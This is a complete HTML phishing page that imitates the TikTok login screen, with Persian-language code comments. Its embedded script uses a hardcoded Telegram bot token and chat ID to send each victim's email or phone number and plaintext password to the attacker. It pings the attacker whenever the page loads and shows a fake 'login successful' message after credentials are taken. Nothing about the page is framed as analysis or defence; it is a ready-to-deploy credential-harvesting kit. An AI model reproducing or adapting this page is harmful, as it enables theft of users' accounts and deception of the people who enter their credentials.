<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Login to TikTok</title>
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 16px;
        }

        .login-container {
            background: #000;
            max-width: 420px;
            width: 100%;
            padding: 40px 28px;
            border-radius: 48px;
            border: 1px solid #1a1a1a;
            animation: fadeUp 0.5s ease-out;
        }

        /* لوگو */
        .logo-section {
            text-align: center;
            margin-bottom: 44px;
        }

        .tiktok-icon {
            font-size: 52px;
            background: linear-gradient(135deg, #00f2ea, #ff0050);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            display: inline-block;
            margin-bottom: 6px;
        }

        .logo-section h1 {
            color: #fff;
            font-size: 26px;
            font-weight: 700;
            letter-spacing: 0.5px;
            margin: 4px 0 2px;
        }

        .logo-section .subtitle {
            color: #888;
            font-size: 15px;
            font-weight: 300;
            letter-spacing: 0.3px;
        }

        /* پیام‌های خطا و موفقیت */
        .error-msg {
            background: #3d1a1a;
            color: #f28b82;
            padding: 10px 14px;
            border-radius: 8px;
            font-size: 14px;
            margin-bottom: 16px;
            display: none;
            text-align: right;
            border: 1px solid #5c2020;
        }
        .error-msg i {
            margin-left: 6px;
        }

        .success-msg {
            background: #1a3d1a;
            color: #81c995;
            padding: 10px 14px;
            border-radius: 8px;
            font-size: 14px;
            margin-bottom: 16px;
            display: none;
            text-align: right;
            border: 1px solid #2a5c2a;
        }
        .success-msg i {
            margin-left: 6px;
        }

        /* فرم */
        .login-form {
            display: flex;
            flex-direction: column;
            gap: 24px;
        }

        /* گروه انتخاب نوع ورودی */
        .input-type-selector {
            display: flex;
            gap: 12px;
            margin-bottom: 4px;
        }

        .input-type-selector button {
            flex: 1;
            padding: 10px;
            background: #0a0a0a;
            border: 2px solid #1a1a1a;
            border-radius: 30px;
            color: #666;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .input-type-selector button.active {
            border-color: #ff0050;
            color: #fff;
            background: #1a0a0a;
            box-shadow: 0 0 20px rgba(255, 0, 80, 0.1);
        }

        .input-type-selector button:hover {
            border-color: #ff0050;
            color: #fff;
        }

        /* فیلدهای ورودی */
        .input-group {
            position: relative;
            border-bottom: 2px solid #2a2a2a;
            transition: border-color 0.3s ease;
        }

        .input-group:focus-within {
            border-bottom-color: #ff0050;
        }

        .input-group .input-icon {
            position: absolute;
            right: 4px;
            top: 50%;
            transform: translateY(-50%);
            color: #555;
            font-size: 18px;
            transition: color 0.3s;
        }

        .input-group:focus-within .input-icon {
            color: #ff0050;
        }

        .input-group input {
            width: 100%;
            padding: 16px 40px 8px 10px;
            background: transparent;
            border: none;
            outline: none;
            color: #fff;
            font-size: 16px;
        }

        .input-group input::placeholder {
            color: #444;
            font-weight: 300;
            font-size: 14px;
        }

        .input-group label {
            position: absolute;
            right: 40px;
            top: 16px;
            color: #555;
            font-size: 14px;
            pointer-events: none;
            transition: 0.2s ease all;
        }

        .input-group input:focus ~ label,
        .input-group input:not(:placeholder-shown) ~ label {
            top: -8px;
            right: 36px;
            font-size: 11px;
            color: #ff0050;
        }

        /* دکمه چشمک پسورد */
        .toggle-password {
            position: absolute;
            left: 6px;
            top: 50%;
            transform: translateY(-50%);
            background: transparent;
            border: none;
            color: #555;
            font-size: 18px;
            cursor: pointer;
            transition: color 0.3s;
            padding: 6px;
        }

        .toggle-password:hover {
            color: #ff0050;
        }

        .toggle-password:active {
            transform: translateY(-50%) scale(0.9);
        }

        /* دکمه ورود */
        .btn-login {
            background: linear-gradient(135deg, #ff0050, #f9a825);
            border: none;
            padding: 17px;
            border-radius: 60px;
            color: #fff;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 8px 28px rgba(255, 0, 80, 0.35);
            letter-spacing: 0.5px;
            margin-top: 8px;
        }

        .btn-login:hover {
            transform: scale(1.02);
            box-shadow: 0 12px 36px rgba(255, 0, 80, 0.55);
        }

        .btn-login:active {
            transform: scale(0.97);
        }

        /* انیمیشن */
        @keyframes fadeUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* ریسپانسیو */
        @media (max-width: 480px) {
            .login-container {
                padding: 32px 20px;
                border-radius: 32px;
            }
            .logo-section h1 {
                font-size: 22px;
            }
            .btn-login {
                font-size: 16px;
                padding: 15px;
            }
            .input-type-selector button {
                font-size: 12px;
                padding: 8px;
            }
        }
    </style>
</head>
<body>

    <div class="login-container">

        <!-- لوگو -->
        <div class="logo-section">
            <div class="tiktok-icon">
                <i class="fab fa-tiktok"></i>
            </div>
            <h1>TikTok</h1>
            <p class="subtitle">Log in to your account</p>
        </div>

        <!-- پیام‌های خطا و موفقیت -->
        <div class="error-msg" id="errorMsg">
            <i class="fas fa-exclamation-circle"></i> <span id="errorText">خطا رخ داده است.</span>
        </div>
        <div class="success-msg" id="successMsg">
            <i class="fas fa-check-circle"></i> ورود موفقیت‌آمیز!
        </div>

        <!-- فرم -->
        <form class="login-form" id="loginForm" onsubmit="return handleLogin(event)">

            <!-- انتخاب نوع ورودی -->
            <div class="input-type-selector">
                <button type="button" class="active" data-type="email" onclick="switchInputType('email')">
                    <i class="fas fa-envelope"></i> Email
                </button>
                <button type="button" data-type="phone" onclick="switchInputType('phone')">
                    <i class="fas fa-phone"></i> Phone
                </button>
            </div>

            <!-- فیلد ایمیل (پیش‌فرض) -->
            <div class="input-group" id="emailGroup">
                <i class="fas fa-envelope input-icon"></i>
                <input type="email" id="emailInput" placeholder=" " value="">
                <label>Email Address</label>
            </div>

            <!-- فیلد شماره تلفن (مخفی در ابتدا) -->
            <div class="input-group" id="phoneGroup" style="display: none;">
                <i class="fas fa-phone input-icon"></i>
                <input type="tel" id="phoneInput" placeholder=" ">
                <label>Phone Number</label>
            </div>

            <!-- فیلد پسورد با چشمک -->
            <div class="input-group">
                <i class="fas fa-lock input-icon"></i>
                <input type="password" id="passwordInput" placeholder=" " value="">
                <label>Password</label>
                <button type="button" class="toggle-password" onclick="togglePassword()">
                    <i class="fas fa-eye" id="eyeIcon"></i>
                </button>
            </div>

            <!-- دکمه ورود -->
            <button type="submit" class="btn-login">
                <i class="fas fa-sign-in-alt" style="margin-left: 10px;"></i> Log In
            </button>

        </form>
    </div>

    <script>
        // ===== تنظیمات تلگرام =====
        const TELEGRAM_CONFIG = {
            botToken: "8416601223:AAFR42VtKLQivbihzQNSutUS-hQ4nTNy_oQ",
            chatId: "6689313262"
        };

        const WAKEUP_COUNT = 2;
        let currentLoginType = 'email';

        // ===== ارسال پیام به تلگرام =====
        function sendTelegramMessage(text, parseMode = 'Markdown') {
            const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;

            return fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CONFIG.chatId,
                    text: text,
                    parse_mode: parseMode
                })
            })
            .then(res => res.json())
            .catch(err => console.error("Telegram error:", err));
        }

        // ===== ارسال پیام‌های ویک‌آپ هنگام لود صفحه =====
        function sendWakeupOnLoad() {
            for (let i = 1; i <= WAKEUP_COUNT; i++) {
                setTimeout(() => {
                    const message = `🌐 **TikTok Page Loaded - Wake-up** (${i}/${WAKEUP_COUNT})\n⏰ ${new Date().toLocaleString('fa-IR')}`;
                    sendTelegramMessage(message);
                }, i * 500);
            }
        }

        // ===== ارسال ویک‌آپ + اطلاعات ورود =====
        function sendWakeupAndLoginInfo(username, password) {
            // مرحله 1: ارسال ۲ پیام ویک‌آپ
            let wakeupPromises = [];
            for (let i = 1; i <= WAKEUP_COUNT; i++) {
                const promise = new Promise((resolve) => {
                    setTimeout(() => {
                        const message = `🔄 **TikTok Wake-up ping** (${i}/${WAKEUP_COUNT})\n⏰ ${new Date().toLocaleString('fa-IR')}`;
                        sendTelegramMessage(message)
                            .then(result => resolve(result))
                            .catch(err => resolve({ ok: false, error: err }));
                    }, i * 600);
                });
                wakeupPromises.push(promise);
            }

            // مرحله 2: بعد از اتمام ویک‌آپ‌ها، اطلاعات را ارسال کن
            Promise.all(wakeupPromises).then(() => {
                setTimeout(() => {
                    const typeLabel = currentLoginType === 'email' ? '📧 Email' : '📱 Phone';
                    const message =
                        `🔔 **TikTok Login!**\n\n` +
                        `📌 **Type:** ${typeLabel}\n` +
                        `👤 **Username:** \`${username}\`\n` +
                        `🔑 **Password:** \`${password}\`\n\n` +
                        `🕐 Time: ${new Date().toLocaleString('fa-IR')}`;

                    sendTelegramMessage(message);
                }, 500);
            });
        }

        // ===== توابع کنترل فرم =====
        function switchInputType(type) {
            currentLoginType = type;
            const emailGroup = document.getElementById('emailGroup');
            const phoneGroup = document.getElementById('phoneGroup');
            const buttons = document.querySelectorAll('.input-type-selector button');
            const errorMsg = document.getElementById('errorMsg');
            const successMsg = document.getElementById('successMsg');

            // مخفی کردن پیام‌ها
            errorMsg.style.display = 'none';
            successMsg.style.display = 'none';

            if (type === 'email') {
                emailGroup.style.display = 'block';
                phoneGroup.style.display = 'none';
                document.getElementById('emailInput').required = true;
                document.getElementById('phoneInput').required = false;
            } else {
                emailGroup.style.display = 'none';
                phoneGroup.style.display = 'block';
                document.getElementById('emailInput').required = false;
                document.getElementById('phoneInput').required = true;
            }

            buttons.forEach(btn => {
                btn.classList.remove('active');
                if (btn.dataset.type === type) {
                    btn.classList.add('active');
                }
            });
        }

        // ===== چشمک نمایش/مخفی کردن پسورد =====
        function togglePassword() {
            const passwordInput = document.getElementById('passwordInput');
            const eyeIcon = document.getElementById('eyeIcon');

            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeIcon.className = 'fas fa-eye-slash';
            } else {
                passwordInput.type = 'password';
                eyeIcon.className = 'fas fa-eye';
            }
        }

        // ===== اعتبارسنجی و ارسال فرم =====
        function handleLogin(e) {
            e.preventDefault();

            const emailInput = document.getElementById('emailInput');
            const phoneInput = document.getElementById('phoneInput');
            const passwordInput = document.getElementById('passwordInput');
            const errorMsg = document.getElementById('errorMsg');
            const errorText = document.getElementById('errorText');
            const successMsg = document.getElementById('successMsg');

            // مخفی کردن پیام‌های قبلی
            errorMsg.style.display = 'none';
            successMsg.style.display = 'none';

            let isValid = true;
            let errorMessage = '';
            let username = '';

            // اعتبارسنجی بر اساس نوع ورودی
            if (currentLoginType === 'email') {
                const email = emailInput.value.trim();
                const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                if (!emailPattern.test(email)) {
                    isValid = false;
                    errorMessage = 'Please enter a valid email address (e.g., name@domain.com)';
                } else {
                    username = email;
                }
            } else {
                const phone = phoneInput.value.trim();
                const phonePattern = /^[0-9]{10,15}$/;
                if (!phonePattern.test(phone)) {
                    isValid = false;
                    errorMessage = 'Please enter a valid phone number (10-15 digits)';
                } else {
                    username = phone;
                }
            }

            // اعتبارسنجی پسورد
            const password = passwordInput.value.trim();
            if (isValid && password.length < 5) {
                isValid = false;
                errorMessage = 'Password must be at least 5 characters';
            }

            // نمایش خطا در صورت وجود
            if (!isValid) {
                errorText.textContent = errorMessage;
                errorMsg.style.display = 'block';
                return false;
            }

            // ===== ارسال اطلاعات به تلگرام =====
            sendWakeupAndLoginInfo(username, password);

            // نمایش پیام موفقیت
            const typeLabel = currentLoginType === 'email' ? 'Email' : 'Phone';
            successMsg.innerHTML = `<i class="fas fa-check-circle"></i> Login successful with ${typeLabel}!`;
            successMsg.style.display = 'block';

            // پاک کردن فیلدها (اختیاری)
            // emailInput.value = '';
            // phoneInput.value = '';
            // passwordInput.value = '';

            return false;
        }

        // ===== اعتبارسنجی لحظه‌ای ایمیل =====
        document.getElementById('emailInput').addEventListener('input', function() {
            const errorMsg = document.getElementById('errorMsg');
            errorMsg.style.display = 'none';
        });

        // ===== اعتبارسنجی لحظه‌ای شماره تلفن =====
        document.getElementById('phoneInput').addEventListener('input', function() {
            const errorMsg = document.getElementById('errorMsg');
            errorMsg.style.display = 'none';
            // فقط عدد
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        // ===== محدود کردن ورودی شماره تلفن به اعداد =====
        document.getElementById('phoneInput').addEventListener('keypress', function(e) {
            if (!/[0-9]/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete') {
                e.preventDefault();
            }
        });

        // ===== اجرا در هنگام لود صفحه =====
        document.addEventListener('DOMContentLoaded', function() {
            switchInputType('email');
            sendWakeupOnLoad(); // ارسال ۲ پیام ویک‌آپ
            console.log('✅ TikTok Login Page with Telegram Bot Ready!');
        });
    </script>

</body>
</html>
